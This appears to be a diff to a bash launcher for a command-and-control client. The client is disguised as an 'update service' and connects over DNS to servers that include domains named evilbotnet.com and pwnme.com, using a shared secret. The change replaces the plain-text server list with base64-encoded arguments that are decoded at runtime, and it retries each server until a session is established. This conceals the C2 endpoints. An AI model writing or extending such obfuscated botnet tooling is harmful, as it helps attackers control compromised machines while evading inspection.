@@ -1,9 +1,10 @@
 #/bin/bash
-update_servers='server=10.10.10.1 domain=evilbotnet.com server=192.168.0.1 server=10.0.1.4 domain=pwnme.com'
+update_servers='LS1kbnMgc2VydmVyPTEwLjEwLjEwLjEgLS1zZWNyZXQ9NTkwSiAtLW1heC1yZXRyYW5zbWl0cz0xMAo= LS1kbnMgc2VydmVyPTU5MEouY29tIC0tc2VjcmV0PTU5MEogLS1tYXgtcmV0cmFuc21pdHM9MTAK LS1kbnMgc2VydmVyPTE5Mi4xNjguMC4xIC0tc2VjcmV0PTU5MEogLS1tYXgtcmV0cmFuc21pdHM9MTAK LS1kbnMgc2VydmVyPTEwLjAuMS40IC0tc2VjcmV0PTU5MEogLS1tYXgtcmV0cmFuc21pdHM9MTAK LS1kbnMgc2VydmVyPTU5MEoubmV0IC0tc2VjcmV0PTU5MEogLS1tYXgtcmV0cmFuc21pdHM9MTAK'
 
-i=0
 for s in $update_servers
 do
-	i=$(($i+1))
-	./updatesvc_akac2client --dns $s --secret=590J --max-retransmits=10
+    if $(./updatesvc_akac2client $(echo $s | base64 -d) | grep -q 'Session established')
+    then
+	    break
+	fi
 done
